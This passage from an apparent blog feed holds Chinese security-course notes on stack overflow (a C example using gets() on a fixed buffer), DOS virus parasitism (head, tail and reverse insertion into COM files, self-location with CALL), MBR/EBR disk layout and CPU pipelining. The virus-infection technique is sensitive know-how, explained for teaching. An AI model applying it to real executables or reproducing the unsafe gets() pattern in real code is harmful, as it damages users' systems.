函数调用的扫尾工作</h2><ol><li>平衡栈，清除参数传递消耗的栈空间</li><li>只需要改变esp值就可</li><li>可以由调用函数使用<code>ret 参数占用栈大小</code>来清除</li></ol><h2 id="栈溢出"><a class="markdownIt-Anchor" href="#栈溢出"></a> 栈溢出</h2><p>例如程序：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">16</span>];</span><br><span class="line">    gets(name);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">16</span>&amp;&amp;name[i];i++)</span><br><span class="line">        <span class="built_in">printf</span>(“%c”,name[i]);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>当我们输入的数据大于16个字节时就会产生栈溢出，此时输入的字节会覆盖栈底内容导致出错，这就是栈溢出</p><p><img src="/images/%E7%97%85%E6%AF%92-DOS-%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8/image-20210511202236918.png" alt="image-20210511202236918" /></p><h2 id="例题"><a class="markdownIt-Anchor" href="#例题"></a> 例题</h2><ol><li>关于函数，下列说法不正确的是（       ）<br />A. 被调函数通过EBP+偏移访问主调函数传递的参数<br />B. 被调函数返回后，主调函数不需要再进行清栈的动作<br />C. 被调函数通过寄存器将返回值或返回值地址传递给主调函数<br />D. 被调函数通过EBP-偏移访问自己的局部变量</li></ol><p>参考答案：B</p><p>解析：主调函数是否进行清栈是根据被调函数是否清栈来的，而不是一定不清栈</p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;栈&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#栈&quot;&gt;&lt;/a&gt; 栈&lt;/h2&gt;
&lt;p&gt;定义：是一种用来存储函数调用时的临时信息的结构，如函数调用所传递的参数、函数的返回地址、函数的局部变量等&lt;/p&gt;
&lt;p&gt;特性：先进后出（FILO）&lt;/p&gt;
&lt;p&gt;基本操作：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;PUSH：压栈&lt;/li&gt;
&lt;li&gt;POP：弹栈&lt;/li&gt;
&lt;/ol&gt;</summary>
    
    
    
    <category term="病毒" scheme="https://wsw8.online/categories/%E7%97%85%E6%AF%92/"/>
    
    
    <category term="课程" scheme="https://wsw8.online/tags/%E8%AF%BE%E7%A8%8B/"/>
    
    <category term="病毒" scheme="https://wsw8.online/tags/%E7%97%85%E6%AF%92/"/>
    
  </entry>
  
  <entry>
    <title>病毒_DOS_病毒寄生</title>
    <link href="https://wsw8.online/archives/92e6b388.html"/>
    <id>https://wsw8.online/archives/92e6b388.html</id>
    <published>2021-05-08T12:22:56.000Z</published>
    <updated>2021-05-10T08:30:13.032Z</updated>
    
    <content type="html"><![CDATA[<h2 id="框架"><a class="markdownIt-Anchor" href="#框架"></a> 框架</h2><p>寄生机制</p><blockquote><p>文件型病毒</p><blockquote><p>头插入、尾插入、逆插入</p></blockquote><p>面向文件系统的病毒</p><blockquote><p>引导性病毒</p></blockquote></blockquote><span id="more"></span><p>执行机制</p><blockquote><p>对于com文件，头，尾，逆插入寄生都相当于入口点修改，可以执行</p><p>中断替换</p></blockquote><h2 id="debug使用"><a class="markdownIt-Anchor" href="#debug使用"></a> debug使用</h2><ol><li>-u 反汇编</li><li>-g xxx 运行到xxx中断</li><li>-t 单步</li><li>-r 查看寄存器</li><li>-d 查看内存</li><li>-e 地址 值 修改内存</li><li>-a 地址 添加指令</li></ol><h2 id="病毒的寄生机制"><a class="markdownIt-Anchor" href="#病毒的寄生机制"></a> 病毒的寄生机制</h2><h3 id="头插入"><a class="markdownIt-Anchor" href="#头插入"></a> 头插入</h3><h4 id="dos环境下四种基本可执行文件格式"><a class="markdownIt-Anchor" href="#dos环境下四种基本可执行文件格式"></a> DOS环境下四种基本可执行文件格式</h4><ol><li><p>批处理文件 .bat结尾</p></li><li><p>设备驱动文件 .sys结尾</p></li><li><p>纯代码文件 .com结尾</p><blockquote><p>没有文件头</p><p>缺省从0x100H处开始执行</p><p>没有重定位项</p><p>所有代码和数据控制在64k以内</p></blockquote></li><li><p>EXE文件 .exe结尾</p><blockquote><p>文件以英文字母MZ开头</p><p>有一个文件头，指出每个段定义等信息</p><p>摆脱了代码大小不得超过64k的限制</p></blockquote></li></ol><h4 id="大致思路"><a class="markdownIt-Anchor" href="#大致思路"></a> 大致思路</h4><p>将病毒代码放到正常代码头部合成新的文件</p><h4 id="一些问题"><a class="markdownIt-Anchor" href="#一些问题"></a> 一些问题</h4><ol><li>病毒代码的ret导致直接退出，删掉ret</li><li>删掉ret后执行错误，发现是由于将数据区当指令执行了，利用JMP指令跳过数据区</li><li>正常执行后发现正常代码打印的字符串不对，发现是由于加载偏差，于是在病毒区后面增加代码使其复制正常代码到原来的位置进行覆盖，然后跳转到开始</li><li>在覆盖字符不多的情况下可以正常执行，换作大程序发现程序直接挂掉，发现是由于覆盖的代码将进行覆盖的指令都给覆盖了，于是我们需要保护拷贝指令，将拷贝指令复制到最后面，执行完成后跳转到开始</li></ol><h4 id="总结"><a class="markdownIt-Anchor" href="#总结"></a> 总结</h4><ol><li>多次利用JMP指令控制指令的执行</li><li>处理预期加载地址与实际加载地址不同的问题，处理覆盖的问题</li><li>利用代码拷贝来创造寄生空间或还原现场</li></ol><h3 id="尾插入"><a class="markdownIt-Anchor" href="#尾插入"></a> 尾插入</h3><h4 id="大致思路-2"><a class="markdownIt-Anchor" href="#大致思路-2"></a> 大致思路</h4><p>用JMP指令覆盖正常程序的前3个字节使其跳转到病毒代码，再将覆盖的代码写到病毒代码的最后，执行完病毒代码后将尾部保存的原字节内容覆盖回去再跳转回去执行就可</p><p><img src="/images/%E7%97%85%E6%AF%92-DOS-%E7%97%85%E6%AF%92%E5%AF%84%E7%94%9F/image-20210509192438009.png" alt="image-20210509192438009" /></p><h4 id="自定位代码"><a class="markdownIt-Anchor" href="#自定位代码"></a> 自定位代码</h4><p>但是有一些问题，比如病毒代码的加载偏差，在头插入中我们采用将正常代码拷贝到原来位置来消除加载偏差的，可是如果我们拷贝病毒代码，那就成了头插入了，于是我们要想办法获得加载偏差的值然后在病毒代码中校正，这就是自定位技术（重定位技术）</p><ol><li><p>首先我们想到利用MOV AX，IP来获取IP寄存器的值，可是没有指令有权限访问IP寄存器</p></li><li><p>但是CALL指令很特殊，它会将<strong>下一条</strong>指令的IP压栈后跳转执行，于是我们可以利用这个机制获得加载偏差</p><p><img src="/images/%E7%97%85%E6%AF%92-DOS-%E7%97%85%E6%AF%92%E5%AF%84%E7%94%9F/image-20210509194514539.png" alt="image-20210509194514539" /></p></li></ol><h4 id="总结-2"><a class="markdownIt-Anchor" href="#总结-2"></a> 总结</h4><p><img src="/images/%E7%97%85%E6%AF%92-DOS-%E7%97%85%E6%AF%92%E5%AF%84%E7%94%9F/image-20210509200017110.png" alt="image-20210509200017110" /></p><h3 id="逆差入"><a class="markdownIt-Anchor" href="#逆差入"></a> 逆差入</h3><p>定义：逆插入感染，实际就是一部分代码在原程序的头部，一部分在尾部，将整个原来的程序给包裹起来</p><h4 id="图示"><a class="markdownIt-Anchor" href="#图示"></a> 图示</h4><p>大致思路：</p><p><img src="/images/%E7%97%85%E6%AF%92-DOS-%E7%97%85%E6%AF%92%E5%AF%84%E7%94%9F/image-20210510151224438.png" alt="image-20210510151224438" /></p><p>程序设计：</p><p><img src="/images/%E7%97%85%E6%AF%92-DOS-%E7%97%85%E6%AF%92%E5%AF%84%E7%94%9F/image-20210510152355492.png" alt="image-20210510152355492" /></p><p>感染代码：</p><p><img src="/images/%E7%97%85%E6%AF%92-DOS-%E7%97%85%E6%AF%92%E5%AF%84%E7%94%9F/image-20210510152516043.png" alt="image-20210510152516043" /></p><h4 id="操作"><a class="markdownIt-Anchor" href="#操作"></a> 操作</h4><ol><li>逆差入需要拷贝多次（normal后移、头粘贴、尾粘贴）</li><li>用到了DOS读写文件的中断调用</li></ol><h4 id="dos下的文件读写"><a class="markdownIt-Anchor" href="#dos下的文件读写"></a> DOS下的文件读写</h4><p>类似C语言的fopen、fread、fwrite、fseek、fclose</p><p>打开文件：</p><p><img src="/images/%E7%97%85%E6%AF%92-DOS-%E7%97%85%E6%AF%92%E5%AF%84%E7%94%9F/image-20210510151650600.png" alt="image-20210510151650600" /></p><p>读文件：</p><p><img src="/images/%E7%97%85%E6%AF%92-DOS-%E7%97%85%E6%AF%92%E5%AF%84%E7%94%9F/image-20210510151716651.png" alt="image-20210510151716651" /></p><p>关闭文件：</p><p><img src="/images/%E7%97%85%E6%AF%92-DOS-%E7%97%85%E6%AF%92%E5%AF%84%E7%94%9F/image-20210510151738657.png" alt="image-20210510151738657" /></p><p>写文件：</p><p><img src="/images/%E7%97%85%E6%AF%92-DOS-%E7%97%85%E6%AF%92%E5%AF%84%E7%94%9F/image-20210510151754026.png" alt="image-20210510151754026" /></p><p>移动文件指针：</p><p><img src="/images/%E7%97%85%E6%AF%92-DOS-%E7%97%85%E6%AF%92%E5%AF%84%E7%94%9F/image-20210510151818941.png" alt="image-20210510151818941" /></p><blockquote><p>以上代码将文件指针放在尾部，设置移动的偏移量CX：DX为0，就是不移动，那么调用21h后，得到的新偏移量就是文件大小，也就是AX中存放文件大小</p></blockquote><h4 id="例题"><a class="markdownIt-Anchor" href="#例题"></a> 例题</h4><p><img src="/images/%E7%97%85%E6%AF%92-DOS-%E7%97%85%E6%AF%92%E5%AF%84%E7%94%9F/image-20210510152817598.png" alt="image-20210510152817598" /></p><blockquote><p>应该是从尾至头拷贝，防止覆盖</p></blockquote>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;框架&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#框架&quot;&gt;&lt;/a&gt; 框架&lt;/h2&gt;
&lt;p&gt;寄生机制&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;文件型病毒&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;头插入、尾插入、逆插入&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;面向文件系统的病毒&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;引导性病毒&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="病毒" scheme="https://wsw8.online/categories/%E7%97%85%E6%AF%92/"/>
    
    
    <category term="课程" scheme="https://wsw8.online/tags/%E8%AF%BE%E7%A8%8B/"/>
    
    <category term="病毒" scheme="https://wsw8.online/tags/%E7%97%85%E6%AF%92/"/>
    
    <category term="计算机" scheme="https://wsw8.online/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>病毒_基础_硬盘数据结构</title>
    <link href="https://wsw8.online/archives/57883fea.html"/>
    <id>https://wsw8.online/archives/57883fea.html</id>
    <published>2021-05-08T08:31:12.000Z</published>
    <updated>2021-05-10T08:30:44.349Z</updated>
    
    <content type="html"><![CDATA[<h2 id="硬盘分区"><a class="markdownIt-Anchor" href="#硬盘分区"></a> 硬盘分区</h2><h3 id="作用"><a class="markdownIt-Anchor" href="#作用"></a> 作用</h3><p>建立硬盘数据结构（分区表、扩展分区等）</p><h3 id="执行"><a class="markdownIt-Anchor" href="#执行"></a> 执行</h3><p>分区划分以<strong>柱面</strong>为单位，一个柱面不能属于两个分区</p><span id="more"></span><h2 id="主引导扇区第一个扇区"><a class="markdownIt-Anchor" href="#主引导扇区第一个扇区"></a> 主引导扇区（第一个扇区）</h2><h3 id="图示"><a class="markdownIt-Anchor" href="#图示"></a> 图示</h3><p><img src="/images/%E7%97%85%E6%AF%92-%E5%9F%BA%E7%A1%80-%E7%A1%AC%E7%9B%98%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/image-20210508163959563.png" alt="image-20210508163959563" /></p><h3 id="找到分区入口"><a class="markdownIt-Anchor" href="#找到分区入口"></a> 找到分区入口</h3><h4 id="分区表项的内容"><a class="markdownIt-Anchor" href="#分区表项的内容"></a> 分区表项的内容</h4><p><img src="/images/%E7%97%85%E6%AF%92-%E5%9F%BA%E7%A1%80-%E7%A1%AC%E7%9B%98%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/image-20210508164230521.png" alt="image-20210508164230521" /></p><h4 id="相对扇区数"><a class="markdownIt-Anchor" href="#相对扇区数"></a> 相对扇区数</h4><p>相对于引导记录头部的偏移扇区数</p><h4 id="mbr和ebr"><a class="markdownIt-Anchor" href="#mbr和ebr"></a> MBR和EBR</h4><p>主分区表中的四个分区表项，属于MBR</p><p>扩展分区的分区表项，属于EBR（Extended MBR）</p><blockquote><p>EBR为了兼容MBR，完全复用了MBR的引导扇区格式，但前466个字节为0，后两个分区表项无效，结束标识55AA</p><p>主分区表中最后一个有效主分区记录指向的磁盘空间**（主扩展分区）**将用EBR划分，分为N个逻辑盘，形成EBR链</p><p><img src="/images/%E7%97%85%E6%AF%92-%E5%9F%BA%E7%A1%80-%E7%A1%AC%E7%9B%98%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/image-20210508165341507.png" alt="image-20210508165341507" /></p></blockquote><h3 id="整个图示"><a class="markdownIt-Anchor" href="#整个图示"></a> 整个图示</h3><p><img src="/images/%E7%97%85%E6%AF%92-%E5%9F%BA%E7%A1%80-%E7%A1%AC%E7%9B%98%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/image-20210508165548520.png" alt="image-20210508165548520" /></p><h3 id="定位主分区和扩展分区的关键区别"><a class="markdownIt-Anchor" href="#定位主分区和扩展分区的关键区别"></a> 定位主分区和扩展分区的关键区别</h3><p>主分区：</p><ol><li>偏移量是相对物理盘开始（MBR）的偏移，根据偏移得到的就是该分区的引导扇区和文件系统</li></ol><p>扩展分区：</p><ol><li>偏移量是相对于包含该分区的扩展分区开始处（EBR）而言</li></ol><p><img src="/images/%E7%97%85%E6%AF%92-%E5%9F%BA%E7%A1%80-%E7%A1%AC%E7%9B%98%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/image-20210508170556297.png" alt="image-20210508170556297" /></p><h2 id="硬盘引导过程"><a class="markdownIt-Anchor" href="#硬盘引导过程"></a> 硬盘引导过程</h2><ol><li><p><strong>开机加电自检</strong></p><blockquote><p>开机，CPU跳到FFFF：0000处，由该处的一条JMP指令跳到BIOS的自检程序（POST），自检通过后，加载引导程序（与操作系统无关的MBR，按用户在BIOS中指定顺序，硬盘，软盘，光驱或U盘等）</p></blockquote></li><li><p><strong>读主引导扇区</strong></p><blockquote><p>将主引导扇区MBR读入到内存的0000：7C00，扫描主分区表，搜索激活分区，分区表项第一个字节为0x80表示激活分区</p></blockquote></li><li><p><strong>读激活分区引导扇区</strong></p><blockquote><p>如果有多个激活分区或没有，报错结束。否则读取激活分区引导扇区到0000：7C00</p></blockquote></li><li><p><strong>操作系统引导代码引导系统并读取操作系统初始化文件</strong></p></li></ol><h3 id="注意"><a class="markdownIt-Anchor" href="#注意"></a> 注意</h3><ol><li>MBR中硬盘数据结构与操作系统无关</li><li>操作系统相关的引导代码在激活分区的引导扇区，而MBR的引导程序选择激活分区</li><li>以上步骤采用的是标准MBR，但硬盘也可以引导多系统，要引导多系统必须用专门的引导程序替换标准MBR，这样替换后的硬盘引导代码执行时可让用户选择启动哪个硬盘分区</li></ol><h3 id="x86实模式寻址"><a class="markdownIt-Anchor" href="#x86实模式寻址"></a> X86实模式寻址</h3><ol><li>一个段64k，2字节表示</li><li>段地址：段内偏移     例如：0001：1234</li><li>省略段地址 相对DS数据段寄存器</li><li>为了方便，CS（指令段）、DS（数据段）、ES（附加段）、SS（栈段）设定为相同段</li><li>指令获取 CS：IP、栈操作 SS：SP</li><li>涉及内存的操作指令中没有段信息用DS</li></ol><h2 id="硬盘逻辑锁"><a class="markdownIt-Anchor" href="#硬盘逻辑锁"></a> 硬盘逻辑锁</h2><p>最后一个分区表项又指向了新的MBR形成一个死锁</p><h3 id="思考题"><a class="markdownIt-Anchor" href="#思考题"></a> 思考题</h3><ol><li>如何遍历FAT表获得一个文件所占的簇？</li><li>对于一个多层嵌套的文件，如何找到文件所对应的目录项？</li><li>如何找到硬盘的主分区和扩展分区？</li><li>简述硬盘引导的过程？</li></ol>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;硬盘分区&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#硬盘分区&quot;&gt;&lt;/a&gt; 硬盘分区&lt;/h2&gt;
&lt;h3 id=&quot;作用&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#作用&quot;&gt;&lt;/a&gt; 作用&lt;/h3&gt;
&lt;p&gt;建立硬盘数据结构（分区表、扩展分区等）&lt;/p&gt;
&lt;h3 id=&quot;执行&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#执行&quot;&gt;&lt;/a&gt; 执行&lt;/h3&gt;
&lt;p&gt;分区划分以&lt;strong&gt;柱面&lt;/strong&gt;为单位，一个柱面不能属于两个分区&lt;/p&gt;</summary>
    
    
    
    <category term="病毒" scheme="https://wsw8.online/categories/%E7%97%85%E6%AF%92/"/>
    
    
    <category term="课程" scheme="https://wsw8.online/tags/%E8%AF%BE%E7%A8%8B/"/>
    
    <category term="病毒" scheme="https://wsw8.online/tags/%E7%97%85%E6%AF%92/"/>
    
    <category term="计算机" scheme="https://wsw8.online/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>系统结构第三章_流水线</title>
    <link href="https://wsw8.online/archives/ef24c61a.html"/>
    <id>https://wsw8.online/archives/ef24c61a.html</id>
    <published>2021-05-03T08:22:30.000Z</published>
    <updated>2021-05-10T08:27:03.124Z</updated>
    
    <content type="html"><![CDATA[<h2 id="流水线的基本概念"><a class="markdownIt-Anchor" href="#流水线的基本概念"></a> 流水线的基本概念</h2><h3 id="1-什么是流水线"><a class="markdownIt-Anchor" href="#1-什么是流水线"></a> 1. 什么是流水线</h3><p>定义：流水线是利用执行指令操作之间的并行性，实现多条指令重叠执行的技术</p><h4 id="11-术语"><a class="markdownIt-Anchor" href="#11-术语"></a> 1.1 术语</h4><p>流水段（流水级）：完成一条指令的一部分操作</p><p>机器周期（流水线周期）：指令沿流水线移动一个流水段的时间。长度取决于最慢的流水段，一般是一个时钟周期（有时是两个时钟周期）。每个流水线周期从指令流水线流出一条指令</p><p>吞吐量：单位时间从流水线流出的指令数</p><span id="more"></span><p>流水线设计者：平衡每个流水段的时间，使之等长。因此，每条指令在流水线的平均执行时间在理想情况下为：非流水线机器平均指令执行时间/流水线机器段数</p><p>流水线加速比：非流水线机器平均指令执行时间/流水线机器平均指令执行时间</p><p>理想情况：流水线加速比=流水线机器段数</p><h4 id="12-特点"><a class="markdownIt-Anchor" href="#12-特点"></a> 1.2 特点</h4><ol><li>类似自动装配线</li><li>有多个段（级），段间有<strong>流水线寄存器</strong></li><li>每个流水段执行指令或操作的<strong>不同部分</strong></li><li>流水段之间采用<strong>同步时钟控制</strong></li><li>流水线是开发串行指令流中<strong>并行性</strong>的一种实现技术</li></ol><h3 id="2-risc指令系统的特点"><a class="markdownIt-Anchor" href="#2-risc指令系统的特点"></a> 2. RISC指令系统的特点</h3><ol><li>所有参加运算的数据来自<strong>寄存器</strong>，结果也写入<strong>寄存器</strong>，寄存器为32/64位</li><li>访存只有<code>load</code>和<code>store</code>指令</li><li>指令的类型较少，所有指令<strong>长度相同</strong></li><li>不同指令执行的时钟周期数差别不大</li></ol><h3 id="3-非流水线方式下risc指令系统的实现"><a class="markdownIt-Anchor" href="#3-非流水线方式下risc指令系统的实现"></a> 3. 非流水线方式下RISC指令系统的实现</h3><h4 id="31-多周期cpu实现"><a class="markdownIt-Anchor" href="#31-多周期cpu实现"></a> 3.1 多周期CPU实现</h4><p>假定指令系统是MIPS的一个定点子集：load/store指令，ALU指令，转移指令</p><p>一条指令的执行过程最多需要5个时钟周期：CPI=5</p><p>图示：</p><p><img src="/images/%E7%B3%BB%E7%BB%9F%E7%BB%93%E6%9E%84%E7%AC%AC%E4%B8%89%E7%AB%A0-%E6%B5%81%E6%B0%B4%E7%BA%BF/image-20210504195556778.png" alt="image-20210504195556778" /></p><p>电路图示：</p><p><img src="/images/%E7%B3%BB%E7%BB%9F%E7%BB%93%E6%9E%84%E7%AC%AC%E4%B8%89%E7%AB%A0-%E6%B5%81%E6%B0%B4%E7%BA%BF/image-20210504195639490.png" alt="image-20210504195639490" /></p><p>上图分析：</p><ol><li><p>IF：Instruction fetch cycle</p><blockquote><ol><li>按照PC内容访问指令存储器，取出指令</li><li>PC+4→NPC，以获取下一条指令地址</li></ol></blockquote></li><li><p>ID：Instruction decode/register fetch cycle</p><blockquote><ol><li>指令译码</li><li>读寄存器</li><li>如果需要，则符号扩展指令中的位移量</li></ol></blockquote></li><li><p>EX：Execution（执行）/effective address cycle</p><blockquote><ul><li>Load/Store：计算数据存储器有效地址</li><li>R-R/R-I ALU：执行运算操作</li><li>Branch：做“=0？”测试，并置条件，计算目标地址</li></ul></blockquote></li><li><p>MEM：Memory access</p><blockquote><ul><li>Load：送有效地址到数据存储器，取数据</li><li>Store：写ID，读出数据到有效地址单元中</li><li>Branch：如果条件满足计算目标地址送PC；否则NPC送PC</li></ul></blockquote></li><li><p>WB：Write-back cycle</p><blockquote><ul><li>Load or ALU：写结果到寄存器堆</li></ul></blockquote></li></ol><h4 id="32-多周期实现的改进"><a class="markdownIt-Anchor" href="#32-多周期实现的改进"></a> 3.2 多周期实现的改进</h4><ol><li>对于Branch，将“=0？”测试和计算可能的转移目标地址提前到ID</li><li>完成ALU指令在MEM cycle</li></ol><p>图示：</p><p><img src="/images/%E7%B3%BB%E7%BB%9F%E7%BB%93%E6%9E%84%E7%AC%AC%E4%B8%89%E7%AB%A0-%E6%B5%81%E6%B0%B4%E7%BA%BF/image-20210504201717892.png" alt="image-20210504201717892" /></p><ol start="3"><li><p>改进硬件冗余</p><blockquote><ol><li>ALU可以共享</li><li>数据和指令存储器可以合并</li></ol></blockquote></li></ol><h3 id="4-经典5段流水线risc处理器"><a class="markdownIt-Anchor" href="#4-经典5段流水线risc处理器"></a> 4. 经典5段流水线RISC处理器</h3><h4 id="41-特点"><a class="markdownIt-Anchor" href="#41-特点"></a> 4.1 特点</h4><ol><li>5个段构成一个指令流水线，一条指令经过每个段</li><li>CPI减小到1，因为平均每个时钟周期发射或完成一条指令</li><li>在任意时钟周期，在每个流水段正执行一条指令的部分</li><li>理想情况下，性能提升5倍</li></ol><p>图示：</p><p><img src="/images/%E7%B3%BB%E7%BB%9F%E7%BB%93%E6%9E%84%E7%AC%AC%E4%B8%89%E7%AB%A0-%E6%B5%81%E6%B0%B4%E7%BA%BF/image-20210504202456375.png" alt="image-20210504202456375" /></p><h4 id="42-实现"><a class="markdownIt-Anchor" href="#42-实现"></a> 4.2 实现</h4><p>为了实现，在每两段之间新增流水线寄存器，其作用：</p><ol><li>在本周期提供流水段中指令操作的数据及控制信息</li><li>周期结束时，存指令操作结果供下一个流水段指令使用</li></ol><p>如下图蓝色部分：</p><p><img src="/images/%E7%B3%BB%E7%BB%9F%E7%BB%93%E6%9E%84%E7%AC%AC%E4%B8%89%E7%AB%A0-%E6%B5%81%E6%B0%B4%E7%BA%BF/image-20210504203103762.png" alt="image-20210504203103762" /></p><h4 id="43-对比"><a class="markdownIt-Anchor" href="#43-对比"></a> 4.3 对比</h4><ol><li><p>对比单周期实现，流水线减少了时钟周期长度</p><p><img src="/images/%E7%B3%BB%E7%BB%9F%E7%BB%93%E6%9E%84%E7%AC%AC%E4%B8%89%E7%AB%A0-%E6%B5%81%E6%B0%B4%E7%BA%BF/image-20210504203333003.png" alt="image-20210504203333003" /></p></li><li><p>对比多周期实现，流水线减少了CPI</p><p><img src="/images/%E7%B3%BB%E7%BB%9F%E7%BB%93%E6%9E%84%E7%AC%AC%E4%B8%89%E7%AB%A0-%E6%B5%81%E6%B0%B4%E7%BA%BF/image-20210504203357254.png" alt="image-20210504203357254" /></p></li></ol><h4 id="44-问题"><a class="markdownIt-Anchor" href="#44-问题"></a> 4.4 问题</h4><h5 id="441-存储器访问冲突"><a class="markdownIt-Anchor" href="#441-存储器访问冲突"></a> 4.4.1 存储器访问冲突</h5><p>结构冒险（structure hazard）：在同一时钟周期不同操作使用同一数据通路资源</p><p>图示：</p><p><img src="/images/%E7%B3%BB%E7%BB%9F%E7%BB%93%E6%9E%84%E7%AC%AC%E4%B8%89%E7%AB%A0-%E6%B5%81%E6%B0%B4%E7%BA%BF/image-20210504203832540.png" alt="image-20210504203832540" /></p><p>解决：使用分开的指令cache和数据cache</p><p>图示：</p><p><img src="/images/%E7%B3%BB%E7%BB%9F%E7%BB%93%E6%9E%84%E7%AC%AC%E4%B8%89%E7%AB%A0-%E6%B5%81%E6%B0%B4%E7%BA%BF/image-20210504204140731.png" alt="image-20210504204140731" /></p><p>注意：如果时钟周期不变，流水线存储系统的带宽<strong>必须是非流水线的5倍</strong></p><h5 id="442-寄存器冲突"><a class="markdownIt-Anchor" href="#442-寄存器冲突"></a> 4.4.2 寄存器冲突</h5><p>图示：</p><p><img src="/images/%E7%B3%BB%E7%BB%9F%E7%BB%93%E6%9E%84%E7%AC%AC%E4%B8%89%E7%AB%A0-%E6%B5%81%E6%B0%B4%E7%BA%BF/image-20210504204333445.png" alt="image-20210504204333445" /></p><p>解决：重新设计寄存器堆资源</p><ol><li><p>允许在一个时钟周期WB段先写，ID段后读</p><blockquote><p>每个时钟周期完成2个读和一个写</p><p>需要提供两个读端口和一个写端口</p><p>当写和读同一个寄存器会发生数据冒险（Data hazard）</p></blockquote></li></ol><h5 id="443-更新pc时冲突"><a class="markdownIt-Anchor" href="#443-更新pc时冲突"></a> 4.4.3 更新PC时冲突</h5><p>每个时钟周期必须增量PC并存储到PC</p><p>遇到转移指令时可能会改变PC的值，可能会产生控制冒险（Control hazard）</p><h3 id="5-流水线的基本性能"><a class="markdownIt-Anchor" href="#5-流水线的基本性能"></a> 5. 流水线的基本性能</h3><ol><li>增大了吞吐量（单位时间完成指令条数）</li><li>每一条指令的执行时间没有加快</li><li>延迟：附加的控制增加了开销</li><li>不平衡：流水线各段时间以最慢的为准</li><li>附加开销：流水线寄存器</li><li>流水线冒险：串行机器不会产生冒险</li><li>填充和排空：会减小加速比</li></ol><h2 id="流水线的主要障碍-流水线冒险相关"><a class="markdownIt-Anchor" href="#流水线的主要障碍-流水线冒险相关"></a> 流水线的主要障碍-流水线冒险（相关）</h2><h3 id="1-冒险分类与有停顿流水线性能"><a class="markdownIt-Anchor" href="#1-冒险分类与有停顿流水线性能"></a> 1. 冒险分类与有停顿流水线性能</h3><h4 id="11-冒险分类"><a class="markdownIt-Anchor" href="#11-冒险分类"></a> 1.1 冒险分类：</h4><ol><li>结构冒险：指令重叠执行时，发生硬件资源冲突</li><li>数据冒险：几条指令重叠执行时，后面指令依赖前面指令的结果却没有准备好（没有计算或存储）</li><li>控制冒险：发生在流水线执行转移指令时，在进入ID段时，转移条件和转移目标地址不能按时提供给IF段取下一条指令</li></ol><p>冒险出现时：避免流水线上有冒险的指令执行下一个流水段</p><p>冒险总是可以用停顿（流水线气泡/气泡）解决：停顿时，其后的所有指令被停顿，指令之前的指令继续执行，没有新的指令被取到流水线</p><p>图示：</p><p><img src="/images/%E7%B3%BB%E7%BB%9F%E7%BB%93%E6%9E%84%E7%AC%AC%E4%B8%89%E7%AB%A0-%E6%B5%81%E6%B0%B4%E7%BA%BF/image-20210504211313154.png" alt="image-20210504211313154" /></p><h4 id="12-有停顿的流水线性能"><a class="markdownIt-Anchor" href="#12-有停顿的流水线性能"></a> 1.2 有停顿的流水线性能</h4><p>加速比公式：</p><p><img src="/images/%E7%B3%BB%E7%BB%9F%E7%BB%93%E6%9E%84%E7%AC%AC%E4%B8%89%E7%AB%A0-%E6%B5%81%E6%B0%B4%E7%BA%BF/image-20210504211507892.png" alt="image-20210504211507892" /></p><p>流水线CPI=理想CPI（≈1）+平均每条指令的停顿周期数</p><p>忽略流水线时钟周期的额外开销，并假设流水段是平衡的，则：非流水线时钟周期=流水线时钟周期</p><p>最终得：</p><p><img src="/images/%E7%B3%BB%E7%BB%9F%E7%BB%93%E6%9E%84%E7%AC%AC%E4%B8%89%E7%AB%A0-%E6%B5%81%E6%B0%B4%E7%BA%BF/image-20210504212021602.png" alt="image-20210504212021602" /></p><h3 id="2-结构冒险流水段竞争"><a class="markdownIt-Anchor" href="#2-结构冒险流水段竞争"></a> 2. 结构冒险：流水段竞争</h3><h4 id="21-定义"><a class="markdownIt-Anchor" href="#21-定义"></a> 2.1 定义</h4><p>发生在同一时钟周期，2条或多条指令想要使用同一硬件资源</p><h4 id="22-出现情况"><a class="markdownIt-Anchor" href="#22-出现情况"></a> 2.2 出现情况</h4><ol><li>多重访问寄存器堆</li><li>多重访问存储器</li><li>没有或没有充分流水功能部件</li></ol><h4 id="23-解决"><a class="markdownIt-Anchor" href="#23-解决"></a> 2.3 解决</h4><ol><li><p>寄存器堆的多重访问</p><blockquote><p>图示：</p><p><img src="/images/%E7%B3%BB%E7%BB%9F%E7%BB%93%E6%9E%84%E7%AC%AC%E4%B8%89%E7%AB%A0-%E6%B5%81%E6%B0%B4%E7%BA%BF/image-20210504213234617.png" 